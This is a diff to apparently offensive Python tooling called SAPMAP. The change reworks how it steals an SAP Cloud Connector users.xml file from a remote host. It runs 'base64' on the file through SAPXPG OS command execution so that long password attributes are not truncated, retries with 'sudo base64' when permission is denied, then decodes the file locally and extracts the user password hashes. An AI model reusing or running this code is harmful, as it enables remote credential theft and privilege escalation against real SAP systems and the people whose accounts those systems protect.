@@ -1866,24 +1866,40 @@ def create_app(api: SAPMAPApi) -> Bottle:
                           f"{n.sid} (checked {len(scc_roots)} paths)")
                     continue
 
-                content, _ = _gw("cat", fpath)
-                print(f"[*] SCC {host}: cat output ({len(content)} chars): "
-                      f"{content[:80]!r}")
-                if "Permission denied" in content:
-                    print(f"[*] SCC {host}: cat permission denied — "
-                          f"trying sudo cat")
-                    content, _ = _gw("sudo", f"cat {fpath}")
-                    print(f"[*] SCC {host}: sudo cat ({len(content)} chars): "
-                          f"{content[:80]!r}")
-                if content.strip().startswith("<"):
-                    xml_bytes = content.encode("utf-8", errors="replace")
+                # SAPXPG truncates output lines at ~128 bytes. The <user>
+                # element with its long password attribute exceeds that,
+                # producing incomplete XML. Read via base64 instead — it
+                # outputs 76-char lines regardless of input line length,
+                # then we decode back to XML on our side.
+                def _read_via_base64(prog, arg):
+                    out, ok = _gw(prog, arg)
+                    if not ok or "Permission denied" in out:
+                        return None, out
+                    import base64 as _b64e
+                    b64 = out.replace("\n", "").replace("\r", "").strip()
+                    try:
+                        return _b64e.b64decode(b64), ""
+                    except Exception as e:
+                        return None, f"base64 decode error: {e}"
+
+                raw, err = _read_via_base64("base64", fpath)
+                print(f"[*] SCC {host}: base64 read → "
+                      f"{len(raw) if raw else 0}B err={err[:60]!r}")
+                if raw is None and "Permission denied" in err:
+                    print(f"[*] SCC {host}: permission denied — "
+                          f"trying sudo base64")
+                    raw, err = _read_via_base64("sudo", f"base64 {fpath}")
+                    print(f"[*] SCC {host}: sudo base64 → "
+                          f"{len(raw) if raw else 0}B err={err[:60]!r}")
+                if raw and raw.strip().startswith(b"<"):
+                    xml_bytes = raw
                     xml_source = f"on-disk via {n.sid} OS-exec ({fpath})"
                     print(f"[+] SCC {host}: users.xml read via {n.sid} "
                           f"({len(xml_bytes)} bytes)")
                     break
                 else:
-                    print(f"[-] SCC {host}: could not read {fpath} — "
-                          f"both cat and sudo cat failed")
+                    print(f"[-] SCC {host}: could not read {fpath} via "
+                          f"base64 — err={err!r}")
             except Exception as e:
                 print(f"[-] SCC {host}: OS-exec Path 1 error: {e}")
 
@@ -1976,8 +1992,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"ok": False, "error": diag})
 
         # --- Parse XML ---------------------------------------------------
-        print(f"[*] SCC {host}: xml_bytes ({len(xml_bytes)}B) first 200: "
-              f"{xml_bytes[:200]!r}")
+        print(f"[*] SCC {host}: parsing {len(xml_bytes)}B of XML")
         from sapmap_scc_keystore import parse_user_hashes_from_xml
         result = parse_user_hashes_from_xml(xml_bytes)
         if not result.get("ok"):
